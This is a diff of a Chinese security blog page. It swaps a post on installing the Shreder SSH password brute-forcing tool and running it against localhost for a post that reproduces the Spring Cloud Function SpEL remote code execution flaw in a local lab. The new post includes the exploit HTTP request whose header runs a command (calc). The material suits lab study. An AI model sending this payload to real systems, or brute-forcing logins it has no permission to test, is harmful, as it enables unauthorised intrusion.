@@ -5,7 +5,7 @@
 <meta name="description" content="" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>
-    SHREDER学习&amp;使用笔记 | 冄老狗
+    [记录网安生活] Spring RCE EXP | 冄老狗
 </title>
 <link rel="shortcut icon" href="https://chinaran0.github.io//favicon.ico?v=1648575857632">
 <!-- <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous"> -->
@@ -99,34 +99,29 @@
                 <div id="content" class="main-container-left">
                     <article class="post i-card">
                         <h2 class="post-title">
-                            SHREDER学习&amp;使用笔记
+                            [记录网安生活] Spring RCE EXP
                         </h2>
                         <div class="post-info">
-                            <time class="post-time">2021-08-19</time>
+                            <time class="post-time">2022-03-30</time>
                             
+                                <a href="https://chinaran0.github.io/tag/JoRex_R-o/" class="post-tag i-tag
+                            i-tag-primary">
+                            #网络安全
+                        </a>
+                                
                         </div>
                         
-                            <div class="post-feature-image" style="background-image: url('https://chinaran0.github.io//post-images/shreder-xue-xi-andshi-yong-bi-ji.png')"></div>
-                            
                                 <div class="post-content">
-                                    <p>Shreder是一款ssh协议跑字典工具<br>
-跑字典咱们有九头🐍就够了，但是遇到一个工具学习一个工具，这是对开发者的尊重。<br>
-项目地址：https://github.com/EntySec/Shreder</p>
-<p>sudo apt-get install python3-pip<br>
-安装pip</p>
-<p>安装shreder<br>
-pip3 install git+https://github.com/EntySec/Shreder</p>
-<p>他给我们报了个WARNING<br>
-WARNING: The script shreder is installed in '/home/liyu/.local/bin' which is not on PATH.<br>
-Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.</p>
-<p>不用管他，直接去<br>
-/home/liyu/.local/bin'找就行<br>
-<img src="https://chinaran0.github.io//post-images/1646310949392.png" alt="" loading="lazy"><br>
-行了，找个字典跑吧，由于我本机就是ubuntu，所以我们直接干127.0.0.1<br>
-shreder 127.0.0.1 -u liyu -l /media/liyu/软件/passwd.txt<br>
-[!] Password is not found.<br>
-[i] Time elapsed: 0.705286979675293</p>
-<p>当然跑不出来，我怎么可能会出现弱口令呢🤓</p>
+                                    <p>复现环境：https://github.com/Pizz33/Spring-Cloud-Function-SpEL<br>
+使用idea新增一个spring lnitializr项目，选择与环境匹配的java版本添加spring web和function右侧栏选择maven-package编译jar包编译完成后运行jar包<br>
+java -jar demo-0.0.1-SNAPSHOT.jar</p>
+<p>POST /functionRouter HTTP/1.1<br>
+Host: 127.0.0.1:8080<br>
+spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)<br>
+Content-Type: application/x-www-form-urlencoded<br>
+Content-Length: 5</p>
+<p>ran</p>
+<figure data-type="image" tabindex="1"><img src="https://chinaran0.github.io//post-images/1648573579057.jpg" alt="" loading="lazy"></figure>
 
                                 </div>
                     </article>
@@ -134,9 +129,9 @@ shreder 127.0.0.1 -u liyu -l /media/liyu/软件/passwd.txt<br>
                     
                         <div class="next-post">
                             <div class="next">下一篇</div>
-                            <a href="https://chinaran0.github.io/post/chi-gua-bei-webre-shen-shellme_revengea/">
+                            <a href="https://chinaran0.github.io/post/ji-lu-wang-an-sheng-huo-jing-ti-you-ren-li-yong-spring-rce-exp-diao-yu/">
                                 <h3 class="post-title">
-                                    吃瓜杯WEB[热身][SHELLME_REVENGE]
+                                    [记录网安生活] 警惕，有人利用Spring RCE EXP 钓鱼！
                                 </h3>
                             </a>
                         </div>
